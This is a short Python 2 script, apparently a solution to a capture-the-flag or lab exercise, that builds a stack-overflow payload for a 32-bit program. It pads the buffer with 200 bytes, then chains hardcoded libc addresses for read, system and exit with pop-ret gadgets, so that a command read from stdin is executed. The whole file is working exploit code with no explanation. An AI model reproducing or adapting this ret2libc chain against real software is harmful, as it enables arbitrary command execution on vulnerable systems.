faddr_read = "\xf0\x6a\xed\xf7"
faddr_system = "\xa0\xbd\xe3\xf7"
faddr_exit = "\xd0\xf9\xe2\xf7"

arg_stdin = "\x00\x00\x00\x00"
arg_bufaddr = "\x24\xa0\x04\x08" 
arg_len = "\x08\x00\x00\x00"

arg_status = "\x01\x00\x00\x00"

gaddr_pppr = "\x23\x85\x04\x08"
gaddr_pr = "\x26\x85\x04\x08"

ex = "A"*200 + "B"*4 + faddr_read + gaddr_pppr + arg_stdin + arg_bufaddr + arg_len + faddr_system + gaddr_pr + arg_bufaddr + faddr_exit + arg_status

print ex



